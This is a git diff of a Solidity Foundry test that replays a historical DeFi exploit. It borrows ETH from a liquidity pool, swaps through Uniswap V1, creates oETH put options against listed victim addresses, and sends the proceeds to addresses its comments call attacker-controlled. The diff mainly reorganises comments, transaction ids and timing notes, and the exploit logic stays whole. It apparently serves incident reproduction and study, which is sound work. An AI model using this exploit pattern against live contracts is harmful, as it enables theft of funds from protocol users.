@@ -48,44 +48,62 @@ contract Attacker is Test {
         console.log("[Before Attack] EtherToken.balanceOf(EXPLOIT) = %18e", etherToken.balanceOf(address(exploit)));
         console.log("----------------------------------------");
 
-        exploit.func_0xe80d7537(""); // txid: 0x89ac16c20a8deafdb405eb04411c484782beb0a9694fc460b2839f86e76a2f83, height 10592396 (0 external calls)
-        exploit.func_0xe80d7537(""); // txid: 0x9a0939618979c7514a71fedc2d1438a81b944b1ffe9aa557ff0a2f9bfaf14fd2, height 10592396 (0 external calls)
+        // 0 external calls
+        exploit.func_0xe80d7537(""); // txid: 0x89ac16c20a8deafdb405eb04411c484782beb0a9694fc460b2839f86e76a2f83, height 10592396, T
+        exploit.func_0xe80d7537(""); // txid: 0x9a0939618979c7514a71fedc2d1438a81b944b1ffe9aa557ff0a2f9bfaf14fd2, height 10592396, T
         
-        // txid: 0xa858463f30a08c6f3410ed456e59277fbe62ff14225754d2bb0b4f6a75fdc8ad, height 10592402 (borrow ETH and use it to get oETH)
+        // Borrow ETH and use it to get oETH
+        // txid: 0xa858463f30a08c6f3410ed456e59277fbe62ff14225754d2bb0b4f6a75fdc8ad, height 10592402, T
         exploit.func_0x08e9147b(255 ether, 24 ether, 2_720_000_000, 89_900_000_000, 0x076C95c6cd2eb823aCC6347FdF5B3dd9b83511E4, 0);
 
-        exploit.getUSDC(75 ether);   // txid: 0xcd1ce9347632f4313ce747aca80129933bbe35e941090d0f6b551ce73a0c0904, height 10592419 (Swap ETH in ExploitContract to USDC)
+        // Swap ETH in ExploitContract to USDC
+        // txid: 0xcd1ce9347632f4313ce747aca80129933bbe35e941090d0f6b551ce73a0c0904, height 10592419, T+1m4s
+        exploit.getUSDC(75 ether);
 
         //--------------------------------------------------------------------------------------------------------
+        // txid: 0xd06378b73536e7718895069a5219855774d362db47312dc304dfd4b6e39ef000, height 10592428, T+5m28s
         address[] memory victims_1 = new address[](1);
         uint256[] memory amtToCreates_1 = new uint256[](1);
         victims_1[0] = 0x25125E438b7Ae0f9AE8511D83aBB0F4574217C7a;
         amtToCreates_1[0] = 750_000_000;
-        exploit.func_0xfad517ac(victims_1, amtToCreates_1); // txid: 0xd06378b73536e7718895069a5219855774d362db47312dc304dfd4b6e39ef000, height 10592428
+        exploit.func_0xfad517ac(victims_1, amtToCreates_1); 
 
+        // txid: 0x351bcbb182cb11cecb0d50d9f1bf45bd6820b71f7de5ec1ef607518865d43dc2, height 10592504, T+19m48s
         address[] memory victims_2 = new address[](2);
         uint256[] memory amtToCreates_2 = new uint256[](2);
         victims_2[0] = 0x2CaA6c95dCbe5a4beD332bDC59D5219d89398a54;
         victims_2[1] = 0xC5Df4d5ED23F645687A867D8F83a41836FCf8811;
         amtToCreates_2[0] = 180_000_000;
         amtToCreates_2[1] = 270_000_000;
-        exploit.func_0xfad517ac(victims_2, amtToCreates_2); // txid: 0x351bcbb182cb11cecb0d50d9f1bf45bd6820b71f7de5ec1ef607518865d43dc2, height 10592504
+        exploit.func_0xfad517ac(victims_2, amtToCreates_2); 
 
+        // txid: 0x56de6c4bd906ee0c067a332e64966db8b1e866c7965c044163a503de6ee6552a, height 10592517, T+21m30s
         address[] memory victims_3 = new address[](1);
         uint256[] memory amtToCreates_3 = new uint256[](1);
         victims_3[0] = 0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2;
         amtToCreates_3[0] = 300_000_000;
-        exploit.func_0xfad517ac(victims_3, amtToCreates_3); // txid: 0x56de6c4bd906ee0c067a332e64966db8b1e866c7965c044163a503de6ee6552a, height 10592517
+        exploit.func_0xfad517ac(victims_3, amtToCreates_3); 
         //--------------------------------------------------------------------------------------------------------
         
-        exploit.func_0x91622bd5(address(this), 5 ether); // txid: 0x30d41ecb0d5806d862931ac77bb8d3812abaf0a11bba7d624204124a7aa9978e, height 10592539 (deposit 5 ETH and transfer EtherToken to 0x4728b2a621a5ae3868d85b5e482bbe2b55d0cba4)
-        exploit.func_0x91622bd5(address(this), 108 ether); // txid: 0x91e5e6aa2edd65252620a15303bf733a5d0a20d5458dd41502c77fe8ec456b1d, height 10592551 (deposit 108 ETH and transfer EtherToken to 0x4728b2a621a5ae3868d85b5e482bbe2b55d0cba4)
+        // Deposit 5 ETH and transfer EtherToken to 0x4728b2a621a5ae3868d85b5e482bbe2b55d0cba4 (probably another EOA that under attacker's control)
+        // txid: 0x30d41ecb0d5806d862931ac77bb8d3812abaf0a11bba7d624204124a7aa9978e, height 10592539, T+26m3s
+        exploit.func_0x91622bd5(address(this), 5 ether);
 
-        exploit.getETH(usdc.balanceOf(address(exploit))); // txid: 0xda1f731ce0275488c9b77440dfa581c3f972e559d8086c5be77cf07d01af09a7, height 10592556 (Swap USDC to ETH)
+        // Deposit 108 ETH and transfer EtherToken to 0x4728b2a621a5ae3868d85b5e482bbe2b55d0cba4 (probably another EOA that under attacker's control)
+        // txid: 0x91e5e6aa2edd65252620a15303bf733a5d0a20d5458dd41502c77fe8ec456b1d, height 10592551, T+28m20s
+        exploit.func_0x91622bd5(address(this), 108 ether);
 
-        exploit.func_0x29584868(address(this), ""); // txid: 0xea1fb009b0ef1673de2ba6a82afff766cd0e68e1c089dc532cec40864c295590, height 10592563 (Withdraw ETH in ExploitContract to 0x9f0af03de9492aa4dd83943cd4c5463bb740b336)
+        // Swap USDC to ETH
+        // txid: 0xda1f731ce0275488c9b77440dfa581c3f972e559d8086c5be77cf07d01af09a7, height 10592556, T+29m30s
+        exploit.getETH(usdc.balanceOf(address(exploit)));
 
-        exploit.func_0x032a67c2(0, true); // txid: 0xe332e0946b0fe23e412d488412048d324341f886236cb20d658dc22142870f5b, height 10592566 (0 external calls)
+        // Withdraw the ETHs in ExploitContract to 0x9f0af03de9492aa4dd83943cd4c5463bb740b336 (probably another EOA that under attacker's control)
+        // txid: 0xea1fb009b0ef1673de2ba6a82afff766cd0e68e1c089dc532cec40864c295590, height 10592563, T+31m37s
+        exploit.func_0x29584868(address(this), "");
+
+        // 0 external calls
+        // txid: 0xe332e0946b0fe23e412d488412048d324341f886236cb20d658dc22142870f5b, height 10592566, T+32m53s
+        exploit.func_0x032a67c2(0, true);
 
         //--------------------------------------------------------------------------------------------------------
 
@@ -136,13 +154,14 @@ contract Exploit {
         _ethExerciseInputAmount = ethExerciseInputAmount;
         _collateralAmount = collateralAmount;
         _vaultExerciseFrom = vaultExerciseFrom;
-        liquidityPool.borrow(eth, 856 ether, ""); // not sure how 856 ether is calculated
+        liquidityPool.borrow(eth, 856 ether, ""); // not sure how the 856 ether is calculated, we use hardcoded here instead
     }
 
     function getUSDC(uint256 amount) public {
         require(address(this).balance >= amount, "Insufficient balance");
         address UniV1_USDC_ETH = UniV1Factory.getExchange(address(usdc));
-        IUniswapV1(UniV1_USDC_ETH).ethToTokenSwapInput{value: amount}(1, 1699997362); // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value
+        IUniswapV1(UniV1_USDC_ETH).ethToTokenSwapInput{value: amount}(1, 1699997362);
+        // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value by attacker by attacker
     }
 
     fallback() external payable {
@@ -153,8 +172,9 @@ contract Exploit {
             usdc.approve(UniV1_USDC_ETH, 100 ether);
             usdc.approve(address(oETH330Put), 100 ether);
 
-            IUniswapV1(UniV1_USDC_ETH).ethToTokenSwapInput{value: _ethToUSDCSwapInputAmount}(1, 1699997362); // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value
-            IUniswapV1(UniV1_oETH330Put_ETH).ethToTokenSwapInput{value: _ethToOETHSwapInputAmount}(1, 1699997362); // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value
+            IUniswapV1(UniV1_USDC_ETH).ethToTokenSwapInput{value: _ethToUSDCSwapInputAmount}(1, 1699997362);
+            IUniswapV1(UniV1_oETH330Put_ETH).ethToTokenSwapInput{value: _ethToOETHSwapInputAmount}(1, 1699997362);
+            // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value by attacker
 
             oETH330Put.createERC20CollateralOption(_ethExerciseInputAmount, _collateralAmount, address(this));
 
@@ -166,7 +186,8 @@ contract Exploit {
 
             oETH330Put.removeUnderlying();
 
-            IUniswapV1(UniV1_USDC_ETH).tokenToEthSwapInput(usdc.balanceOf(address(this)), 1, 1699997362); // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value
+            IUniswapV1(UniV1_USDC_ETH).tokenToEthSwapInput(usdc.balanceOf(address(this)), 1, 1699997362);
+            // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value by attacker
             
             payable(address(liquidityPool)).transfer(msg.value + 0.1 ether);
         }
@@ -179,16 +200,21 @@ contract Exploit {
     
     function getETH(uint256 _amount) public {
         address UniV1_USDC_ETH = UniV1Factory.getExchange(address(usdc));
-        IUniswapV1(UniV1_USDC_ETH).tokenToEthSwapInput(_amount, 1, 1699997362); // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value
+        IUniswapV1(UniV1_USDC_ETH).tokenToEthSwapInput(_amount, 1, 1699997362);
+        // 1699997362 = 2023-11-14T21:29:22Z, it seems like a hardcoded value by attacker
     }
 
     function func_0x29584868(address sendTo, bytes32) public {
         payable(sendTo).transfer(address(this).balance);
     }
 
-    function func_0xe80d7537(bytes calldata) public {} // I skipped this function because it's not necessary for the attack
+    function func_0xe80d7537(bytes calldata) public {
+        // I skipped this function's implementation because it's not necessary for the attack
+    }
 
-    function func_0x032a67c2(bytes32, bool) public {} // I skipped this function because it's not necessary for the attack
+    function func_0x032a67c2(bytes32, bool) public {
+        // I skipped this function's implementation because it's not necessary for the attack   
+    } 
 }
 
 // ------------------------------------------------------------------
